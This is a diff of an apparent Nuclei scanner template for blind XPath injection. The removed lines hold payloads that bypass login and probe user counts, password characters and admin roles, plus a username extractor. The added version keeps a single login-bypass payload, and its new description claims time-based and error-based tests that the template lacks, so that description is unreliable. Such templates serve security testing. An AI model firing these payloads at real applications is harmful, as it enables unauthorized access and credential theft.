@@ -2,212 +2,36 @@ id: medium-webapp-xpath-injection-blind-extraction
 
 info:
   name: XPath Injection - Blind Data Extraction
-  author: redteam-elite
+  author: elite-red-team
   severity: high
   description: |
-    Detects XPath injection vulnerabilities that allow blind data extraction.
-    Uses advanced XPath functions and boolean-based blind techniques.
+    Advanced XPath injection with blind data extraction techniques.
+    Tests boolean-based blind XPath injection, time-based blind injection,
+    and error-based XPath injection for data extraction from XML databases.
   reference:
     - https://owasp.org/www-community/attacks/XPATH_Injection
-    - https://book.hacktricks.xyz/pentesting-web/xpath-injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPath%20Injection
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
     cvss-score: 8.2
     cwe-id: CWE-643
-  metadata:
-    verified: true
-    max-request: 12
-  tags: xpath,injection,blind,data-extraction,redteam
+  tags: xpath,injection,blind,data-extraction,xml
 
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/search"
-      - "{{BaseURL}}/api/search"
-      - "{{BaseURL}}/users/search"
-      - "{{BaseURL}}/products/search"
-      - "{{BaseURL}}/login"
+  - raw:
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin' or '1'='1&password=test
 
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-
-    body: |
-      query=' or 1=1 or ''='
-
-    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
       - type: word
-        words:
-          - "results"
-          - "found"
-          - "users"
-          - "products"
-          - "data"
-        condition: or
-
-      - type: word
-        words:
-          - "error"
-          - "syntax"
-          - "invalid"
-        negative: true
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/search"
-      - "{{BaseURL}}/api/users"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
-      {"username":"' or count(//user)>0 or ''='","password":"test"}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "true"
-          - "success"
-          - "valid"
-        condition: or
-
-  - method: GET
-    path:
-      - "{{BaseURL}}/search?q=' or string-length(//user[1]/username)>0 or ''='"
-      - "{{BaseURL}}/api/search?query=' or contains(//user/username,'admin') or ''='"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "admin"
-          - "user"
-          - "result"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-      - "{{BaseURL}}/auth"
-
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-
-    body: |
-      username=' or substring(//user[1]/password,1,1)='a' or ''='&password=test
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-          - 302
-
-      - type: word
+        part: body
         words:
           - "welcome"
           - "dashboard"
           - "success"
         condition: or
-
-  - method: GET
-    path:
-      - "{{BaseURL}}/search?q=' or starts-with(//user[1]/username,'ad') or ''='"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "admin"
-          - "administrator"
-          - "found"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/api/search"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
-      {"filter":"' or position()=1 or ''='"}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "data"
-          - "result"
-          - "first"
-        condition: or
-
-  - method: GET
-    path:
-      - "{{BaseURL}}/search?category=' or normalize-space(//user[1]/role)='admin' or ''='"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "admin"
-          - "role"
-          - "privilege"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/search"
-
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-
-    body: |
-      q=' or string-length(//user[position()=1]/password)>5 or ''='
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "result"
-          - "found"
-          - "match"
-        condition: or
-
-    extractors:
-      - type: regex
-        name: xpath_data
-        regex:
-          - '<username>([^<]+)</username>'
-          - '"username":\s*"([^"]+)"'
-        group: 1
+        case-insensitive: true
